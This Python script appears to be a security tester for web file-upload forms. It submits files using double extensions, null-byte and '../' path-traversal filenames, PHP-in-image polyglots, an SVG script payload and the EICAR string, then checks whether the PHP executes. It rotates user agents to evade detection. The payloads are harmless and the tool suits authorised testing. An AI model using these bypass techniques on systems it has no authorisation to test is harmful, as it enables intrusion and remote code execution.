#!/usr/bin/env python3
import requests
import json
import sys
import time
import random
import re
import uuid
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import warnings

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
]

class FileUploadTester:
    def __init__(self, base_url, upload_endpoint='/upload', method='POST', auth_header=None, uploaded_prefix='/uploads/', verify_execution=True):
        self.base_url = base_url.rstrip('/')
        self.upload_endpoint = upload_endpoint
        self.method = method.upper()
        self.auth_header = auth_header  # e.g., {'Authorization': 'Bearer token'}
        self.uploaded_prefix = uploaded_prefix
        self.verify_execution = verify_execution
        self.session = requests.Session()
        self.results = []
        self.unique_token = str(uuid.uuid4())[:8]  # For verification

        warnings.warn("\n*** ETHICAL WARNING ***\nThis tool is for TESTING ONLY on systems you OWN or have EXPLICIT PERMISSION to test.\nUploading files without permission may be ILLEGAL.\nAlways clean up after testing.\nDo NOT use on production systems.", UserWarning)

    def log(self, message, status="INFO"):
        print(f"[{status}] {message}")

    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)

    def discover_upload_endpoint(self):
        """Crawl base_url for file upload forms"""
        response = self.fetch_page(self.base_url)
        if not response:
            return None
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form', attrs={'enctype': 'multipart/form-data'})
        if forms:
            action = forms[0].get('action')
            if action:
                self.log(f"Discovered potential upload form at {action}")
                return action
        return None

    def fetch_page(self, url):
        try:
            headers = {'User-Agent': self.get_random_user_agent()}
            if self.auth_header:
                headers.update(self.auth_header)
            response = self.session.get(url, headers=headers, timeout=10)
            return response
        except Exception as e:
            self.log(f"Error fetching page: {e}", "ERROR")
            return None

    def perform_upload(self, filename, content, content_type, extra_headers=None):
        upload_url = urljoin(self.base_url, self.upload_endpoint)
        headers = {'User-Agent': self.get_random_user_agent()}
        if self.auth_header:
            headers.update(self.auth_header)
        if extra_headers:
            headers.update(extra_headers)

        files = {'file': (filename, content, content_type)}

        try:
            if self.method == 'POST':
                response = self.session.post(upload_url, files=files, headers=headers, timeout=10)
            elif self.method == 'PUT':
                response = self.session.put(upload_url, files=files, headers=headers, timeout=10)
            else:
                self.log(f"Unsupported method: {self.method}", "ERROR")
                return None
            return response
        except Exception as e:
            self.log(f"Error uploading: {e}", "ERROR")
            return None

    def verify_uploaded_file(self, filename, expected_executed_output, expected_source):
        verify_url = urljoin(self.base_url, self.uploaded_prefix + filename)
        response = self.fetch_page(verify_url)
        if not response:
            return "NOT_ACCESSIBLE"
        if response.status_code >= 400:
            return f"ERROR_{response.status_code}"
        resp_text = response.text
        if expected_executed_output in resp_text and expected_source not in resp_text:
            return "EXECUTED"  # Vulnerable: code ran
        elif expected_source in resp_text:
            return "SERVED_AS_TEXT"  # Safe: source shown
        else:
            return "UNEXPECTED_RESPONSE"

    def test_file_upload(self):
        self.log("Testing file upload security...")
        if not self.upload_endpoint.startswith('/'):
            self.upload_endpoint = '/' + self.upload_endpoint

        # If no endpoint, try to discover
        if self.upload_endpoint == '/upload':  # Default, try discover
            discovered = self.discover_upload_endpoint()
            if discovered:
                self.upload_endpoint = discovered

        # Safe test payloads (no real malware)
        # Use harmless PHP: echo unique token
        php_payload = f'<?php echo "SAFE_{self.unique_token}"; ?>'.encode()
        expected_output = f"SAFE_{self.unique_token}"
        expected_source = f'<?php echo "SAFE_{self.unique_token}"; ?>'

        # Magic bytes
        jpeg_magic = b'\xFF\xD8\xFF\xE0\x00\x10\x46\x49\x46\x00\x01'
        gif_magic = b'GIF89a;'
        svg_payload = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'  # Note: Manual XSS check needed
        eicar = b'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

        test_cases = [
            # Safe file
            {'filename': 'test.jpg', 'content': jpeg_magic + b'JPEG data', 'type': 'image/jpeg', 'desc': 'Legitimate JPEG'},
            # Harmless PHP
            {'filename': 'test.php', 'content': php_payload, 'type': 'text/php', 'desc': 'Direct PHP upload'},
            # Extension bypasses
            {'filename': 'test.php.jpg', 'content': php_payload, 'type': 'image/jpeg', 'desc': 'Double extension'},
            {'filename': 'test.pHp', 'content': php_payload, 'type': 'text/php', 'desc': 'Case variation'},
            {'filename': 'test.php%00.jpg', 'content': php_payload, 'type': 'image/jpeg', 'desc': 'Null byte injection'},
            {'filename': '../test.php', 'content': php_payload, 'type': 'text/php', 'desc': 'Path traversal'},
            # Magic byte bypasses
            {'filename': 'test.jpg', 'content': jpeg_magic + php_payload, 'type': 'image/jpeg', 'desc': 'JPEG polyglot with PHP'},
            {'filename': 'test.gif', 'content': gif_magic + php_payload, 'type': 'image/gif', 'desc': 'GIF polyglot with PHP'},
            # Other formats
            {'filename': 'test.svg', 'content': svg_payload, 'type': 'image/svg+xml', 'desc': 'SVG with potential XSS (manual check)'},
            # Anti-malware test
            {'filename': 'eicar.com', 'content': eicar, 'type': 'text/plain', 'desc': 'EICAR test file'},
            # More: Add as needed, e.g., .phtml, .phar, etc.
            {'filename': 'test.phtml', 'content': php_payload, 'type': 'text/html', 'desc': 'Alternative PHP extension'},
        ]

        vulnerable = False
        for case in test_cases:
            self.log(f"Testing: {case['desc']} ({case['filename']})")
            response = self.perform_upload(case['filename'], case['content'], case['type'])
            if response:
                success = response.status_code in [200, 201] or "uploaded" in response.text.lower()
                result = {
                    "desc": case['desc'],
                    "filename": case['filename'],
                    "status_code": response.status_code,
                    "success": success,
                    "response_snippet": response.text[:200]
                }
                if success:
                    self.log("Upload succeeded", "WARNING")
                    if self.verify_execution and 'php' in case['filename'].lower() or 'phtml' in case['filename']:
                        verify_status = self.verify_uploaded_file(case['filename'], expected_output, expected_source)
                        result["verify_status"] = verify_status
                        if verify_status == "EXECUTED":
                            self.log("⚠️ Code executed! Vulnerable to RCE", "CRITICAL")
                            vulnerable = True
                        elif verify_status == "SERVED_AS_TEXT":
                            self.log("File served as text - safe from execution", "INFO")
                        elif verify_status.startswith("ERROR_"):
                            self.log("File not accessible - possibly safe", "INFO")
                        else:
                            self.log("Unexpected verification result", "WARNING")
                    elif 'svg' in case['filename']:
                        self.log("SVG uploaded - manually check for XSS in browser", "WARNING")
                    elif 'eicar' in case['filename']:
                        verify_status = self.verify_uploaded_file(case['filename'], "", "")
                        if verify_status != "NOT_ACCESSIBLE" and verify_status != "ERROR_403" and verify_status != "ERROR_404":
                            self.log("EICAR file accessible - no anti-malware or not blocking", "WARNING")
                else:
                    self.log("Upload failed - possibly restricted", "INFO")
                self.results.append(result)
            time.sleep(random.uniform(1, 3))  # Jitter to avoid rate limits

        return vulnerable

    def run_test(self):
        self.log(f"Starting file upload tests for {self.base_url}")
        self.log("=" * 60)
        vulnerable = self.test_file_upload()
        status = "POTENTIAL VULNERABILITIES ⚠️" if vulnerable else "SECURE ✅"
        self.log(f"File Upload: {status}")
        self.log("\n*** REMINDER: Manually clean up uploaded files! ***")
        # Summary and report
        self.save_report()

    def save_report(self):
        report = {
            "base_url": self.base_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "results": self.results
        }
        try:
            with open("file_upload_report.json", "w") as f:
                json.dump(report, f, indent=2)
            self.log("Detailed report saved to 'file_upload_report.json'")
        except Exception as e:
            self.log(f"Error saving report: {e}", "ERROR")

def main():
    if len(sys.argv) < 2:
        print("Usage: python file_upload_test.py <base_url> [upload_endpoint] [method] [uploaded_prefix] [auth_token]")
        sys.exit(1)
    base_url = sys.argv[1]
    upload_endpoint = sys.argv[2] if len(sys.argv) > 2 else '/upload'
    method = sys.argv[3] if len(sys.argv) > 3 else 'POST'
    uploaded_prefix = sys.argv[4] if len(sys.argv) > 4 else '/uploads/'
    auth_token = sys.argv[5] if len(sys.argv) > 5 else None
    auth_header = {'Authorization': f'Bearer {auth_token}'} if auth_token else None
    if not base_url.startswith(('http://', 'https://')):
        base_url = 'https://' + base_url
    tester = FileUploadTester(base_url, upload_endpoint, method, auth_header, uploaded_prefix)
    tester.run_test()

if __name__ == "__main__":
    main()
